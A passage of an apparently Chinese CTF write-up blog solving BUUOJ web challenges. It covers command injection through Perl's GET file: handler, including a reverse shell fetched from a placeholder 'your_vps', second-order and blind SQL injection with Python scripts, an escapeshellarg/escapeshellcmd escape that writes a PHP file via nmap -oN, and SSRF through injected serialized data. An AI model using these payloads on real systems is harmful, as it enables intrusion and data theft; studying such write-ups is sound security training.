<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># touch 'ls|'</span></span><br><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># GET 'file:ls|'</span></span><br></pre></td></tr></table></figure>

<p>通过以上命令成功执行。这里需要注意的是必须要有存在的文件名才能成功执行命令，所以在上面建立了一个<code>ls|</code>文件。</p>
<p>那么这道题的思路就是建立命令执行的文件名，再通过file协议去执行就可以了</p>
<p>首先先看一下大概目录</p>
<p>通过Payload url=/&amp;filename=xxx，然后访问沙盒里面的xxx文件</p>
<p><img src="https://s2.ax1x.com/2019/07/11/ZRn3FI.png" alt="ZRn3FI.png"></p>
<p>发现<code>flag</code>和<code>readflag</code>,flag是空的，readflag似乎是一个二进制文件？，或许需要通过触发readflag来读取flag。</p>
<p>构造文件名 <code>bash -c /readflag</code>,通过如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;&#x2F;etc&#x2F;passwd&amp;filename&#x3D;bash -c &#x2F;readflag|</span><br><span class="line"></span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;a</span><br></pre></td></tr></table></figure>

<p>访问沙盒下的a可以得到flag（这里的<code>/etc/passwd</code>的目的只是为了让我的GET命令请求快点)</p>
<p>第二种方法可以利用反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;your_vps&#x2F;port&amp;filename&#x3D;a</span><br><span class="line"></span><br><span class="line">url&#x3D;&#x2F;etc&#x2F;passwd&amp;filename&#x3D;bash a|</span><br><span class="line"></span><br><span class="line">url&#x3D;file:bash a|&amp;filename&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>同样需要在你的vps上放一下一句话反弹bash。</p>
<h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h3><p>git泄露，<code>git_extract</code>导出一下，代码泄露如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>海星，比起某些代码要好审计的多，代码逻辑：此文件大概有两个功能第一个写文件，插入<code>title,content,category</code>到board表中,并且经过了转义函数过滤，第二个功能，先通过bo_id去判断一下，看有没有这个内容，有的话，接着写内容插入到<code>comment</code>表中，但是这里出现问题了，直接从数组里拿出来我们的<code>category</code>，导致二次注入。</p>
<p>这里有一个很坑的点..(应该说是没遇到过的点)，这个insert是换行的，没法多行注释，也就是没法用<code>#</code>直接将后面所有的都注释掉。平时我们操作的insert注入大概就是如下形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table_name(&#96;xx&#96;,&#96;xx&#96;) values (&#39;xx&#39;,&#39;xx&#39;)</span><br></pre></td></tr></table></figure>

<p>如果我们想要注入的话直接控制第一个xx，为<code>&#39;,user())#</code>直接就可以造成注入，但是这个明显不行了，把这个句子单拿出来看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure>

<p>这里是有换行操作的，所以不能通过<code>#</code>直接将后面的注释掉，需要这样操作<code>category</code>为<code>&#39;,content=user(),/*</code>,content为<code>*/#</code>，即可完成注入，（之所以要在content上注入是因为content内容才会显示出来。</p>
<p>接下来的payload，我搜索了一下数据库为ctf，发现并没有flag。接着读取了一下<code>/etc/passwd</code>，发现www用户，读取一下bash_history.</p>
<p><code>&#39;,content=(select load_file(&#39;/home/www/.bash_history&#39;)),/*</code></p>
<p>发现<code>DS_Store</code>文件，因为是docker下的，所以可以文件在<code>/tmp/html/.DS_Store</code>,读取一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>用hex编码来解决不可见字符，最后发现flag在<strong>flag_8946e1ff1ee3e40f.php</strong>，同样操作读取，获得flag。</p>
<h3 id="Online-tools"><a href="#Online-tools" class="headerlink" title="Online-tools"></a>Online-tools</h3><p>最后就是要说的<code>escapeshellarg与escapeshellcmd</code>函数导致的单引号逃逸问题了，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个Nmap扫描操作，这道题自己一直卡在怎么逃逸出 <code>|， &amp;</code>之类的字符，却忽略了本身nmap的参数问题，真是沙雕。</p>
<p>还是先来两张图明白一下所带来的安全问题</p>
<p><code>escapeshellarg</code>是首先给传递进来的字符两边加个单引号，如过字符串中包含单引号，先转义，两边再各自添加个单引号。</p>
<p><code>escapeshellcmd</code>就是转义危险字符，使得只执行一个命令。例子如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$param = <span class="string">"172.17.0.2' -v -d a=1"</span>;</span><br><span class="line">$ep = escapeshellarg($param);</span><br><span class="line">$eep = escapeshellcmd($ep);</span><br><span class="line">$cmd = <span class="string">"curl "</span>.$eep;</span><br><span class="line"><span class="keyword">echo</span> $ep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $eep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $cmd.<span class="string">"\n"</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="string">'172.17.0.2'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">'</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">curl '</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">* Rebuilt URL to: 172.17.0.2\/</span></span><br></pre></td></tr></table></figure>

<p>最终分为<code>172.17.0.2\</code>  , <code></code>，<code>-v -d a=1&#39;</code>，问题出现在<code>escapeshellcmd</code>，只会转义单个的单引号，不会转义成对的双引号，所以将<code>\</code>转义掉，造成单引号逃逸。再来看着这道题</p>
<p>PS:nmap -oN选项表示将输出导入到文件中</p>
<p>所以构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?php phpinfo();?&gt; -oN shell.php '</span></span><br></pre></td></tr></table></figure>

<p>经过第一次处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>   \<span class="string">'    '</span> <span class="meta">&lt;?php</span> phpninfo();<span class="meta">?&gt;</span> -oN shell .php <span class="string">' \' '</span><span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>第二次</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>   \\ <span class="string">''</span> \&lt;\?php phpinfo\(\)\;\?\? -oN shell.php <span class="string">'\\ '</span><span class="string">''</span></span><br></pre></td></tr></table></figure>

<p>最终成功绕过写入<code>phpinfo()</code>。</p>
<h3 id="Facebook"><a href="#Facebook" class="headerlink" title="Facebook"></a>Facebook</h3><p>首先扫了一下，发现<code>user.php.bak</code>，题目有两个功能一个是join，一个是login，在join的时候发现是有填写博客地址的，怀疑有<code>SSRF</code>。泄露代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然是存在SSRF的，不过注册的时候似乎不能直接SSRF,因为是有过滤操作的。然后发现有<code>no=1</code>的操作，尝试注入，过滤掉了<code>0x</code>，似乎不能用传统的报错注入操作了，不过可以换成<code>makeset</code>操作。</p>
<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)</span><br></pre></td></tr></table></figure>

<p>(XPATH syntax error: ‘~,users’)</p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,make_set(3,%27~%27,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)),1)</span><br></pre></td></tr></table></figure>

<p>(XPATH syntax error: ‘~,no,username,passwd,data,USER,C’)</p>
<p>爆一下<code>data</code>的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(XPATH syntax error: &#39;~,O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:9:&quot;lihuaiqiu&quot;;s:3:&quot;age&quot;;i:11；s:4:&quot;blog&quot;;s:21:&quot;https:&#x2F;&#x2F;www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现储存的是用户的反序列化信息，<strong>所以可以想到，可以通过union进去一个反序列化数据达到SSRF的目的，这样就能绕过join处对博客网址的检测。</strong></p>
<p>似乎对<code>union select</code>做了检测，利用注释符<code>union/**/select</code>绕过，<code>no=-1</code>把其他信息扔掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;2&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:28:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>成功打出flag经过base64加密后的字符串</p>
<p><img src="https://s2.ax1x.com/2019/07/13/ZhaGz8.png" alt="ZhaGz8.png"></p>
<p>解密后即为flag。</p>
<h3 id="Unfinish"><a href="#Unfinish" class="headerlink" title="Unfinish"></a>Unfinish</h3><p>一个二次注入题，通过这道题..，发现自己注入好菜…，注入点在login的<code>username</code>，并且是闭合单引号类型的注入。测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>成功延时3s。</p>
<p>这里的脚本就很迷啊，先贴一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url= <span class="string">"http://web24.buuoj.cn/register.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"abcdefghijklnmopqrsduvwxyz"</span>+<span class="string">"&#123;"</span>+<span class="string">"&#125;"</span>:</span><br><span class="line">        payload=<span class="string">"' or (case when mid((select * from flag)from(&#123;&#125;)for(1))='&#123;&#125;' then sleep(3) else '2' end)='1"</span>.format(a,i)</span><br><span class="line">        da=&#123;<span class="string">"email"</span>:<span class="string">'1@111'</span>,</span><br><span class="line">            <span class="string">"username"</span>:payload,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"11"</span>&#125;</span><br><span class="line">        <span class="comment">#print(db_payload)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url,data=da,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/13/Zhd379.png" alt="Zhd379.png"></p>
<p>跑出来的字符很有问题..可能是网络影响盲注的问题吧。</p>
<h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>两次hex,payload如下，新学到了一个姿势</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;0&#39;+(select hex(hex(database())))+&#39;0</span><br></pre></td></tr></table></figure>

<p>为什么两次hex的原因如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/13/ZhRdjs.png" alt="ZhRdjs.png"></p>
<p><strong>如果字符是<code>flag{}</code>这种形式的，那么第一次Hex是可能会出现字母的，这时与<code>&#39;0&#39;</code>相加后的结果就会把字符舍弃，不符合愿意，所以要进行两次Hex。</strong></p>
<p>这种方法还存在着精度丢失的问题，也就是上面的科学计数法。所以解决的办法就是尽量取出尽可能少的字符个数进行相加。vk师傅应该就是这么做的，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="comment">#!/usr/bin/env python2*</span></span><br><span class="line"><span class="number">2.</span> *<span class="comment"># -\*- coding:utf-8 -\*-*</span></span><br><span class="line"><span class="number">3.</span> </span><br><span class="line"><span class="number">4.</span> <span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="number">5.</span> <span class="keyword">import</span> random</span><br><span class="line"><span class="number">6.</span> <span class="keyword">import</span> sys</span><br><span class="line"><span class="number">7.</span> </span><br><span class="line"><span class="number">8.</span> URL = <span class="string">'http://99836af07612423cb83b84745ccd56dcd11ede0687854475.game.ichunqiu.com'</span></span><br><span class="line"><span class="number">9.</span> </span><br><span class="line"><span class="number">10.</span> </span><br><span class="line"><span class="number">11.</span> <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line"><span class="number">12.</span> ​    data = &#123;</span><br><span class="line"><span class="number">13.</span> ​        <span class="string">"email"</span>: email,</span><br><span class="line"><span class="number">14.</span> ​        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line"><span class="number">15.</span> ​    &#125;</span><br><span class="line"><span class="number">16.</span> ​    res = req.post(URL + <span class="string">'/login.php'</span>, data)</span><br><span class="line"><span class="number">17.</span> ​    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1 '</span> <span class="keyword">in</span> res.content:</span><br><span class="line"><span class="number">18.</span> ​        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="number">19.</span> ​    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> </span><br><span class="line"><span class="number">22.</span> <span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(u, e)</span>:</span></span><br><span class="line"><span class="number">23.</span> ​    data = &#123;</span><br><span class="line"><span class="number">24.</span> ​        <span class="string">"username"</span>: u,</span><br><span class="line"><span class="number">25.</span> ​        <span class="string">"email"</span>: e,</span><br><span class="line"><span class="number">26.</span> ​        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line"><span class="number">27.</span> ​    &#125;</span><br><span class="line"><span class="number">28.</span> ​    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="number">29.</span> ​    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line"><span class="number">30.</span> ​        <span class="keyword">return</span> login(e)</span><br><span class="line"><span class="number">31.</span> ​    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="number">32.</span> table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line"><span class="number">33.</span> </span><br><span class="line"><span class="number">34.</span> </span><br><span class="line"><span class="number">35.</span> <span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(pl)</span>:</span></span><br><span class="line"><span class="number">36.</span> ​    email = <span class="string">''</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">'@qq.com'</span></span><br><span class="line"><span class="number">37.</span> ​    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"><span class="number">38.</span> </span><br><span class="line"><span class="number">39.</span> </span><br><span class="line"><span class="number">40.</span> <span class="function"><span class="keyword">def</span> <span class="title">getLen</span><span class="params">(sql)</span>:</span></span><br><span class="line"><span class="number">41.</span> ​    print(<span class="string">"[+] Starting getLen..."</span>)</span><br><span class="line"><span class="number">42.</span> ​    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line"><span class="number">43.</span> ​        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</span><br><span class="line"><span class="number">44.</span> ​        sys.stdout.flush()</span><br><span class="line"><span class="number">45.</span> ​        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</span><br><span class="line"><span class="number">46.</span> ​            print(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</span><br><span class="line"><span class="number">47.</span> ​            <span class="keyword">return</span> i</span><br><span class="line"><span class="number">48.</span> ​    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="number">49.</span> </span><br><span class="line"><span class="number">50.</span> </span><br><span class="line"><span class="number">51.</span> <span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(sql=<span class="string">"version()"</span>)</span>:</span></span><br><span class="line"><span class="number">52.</span> ​    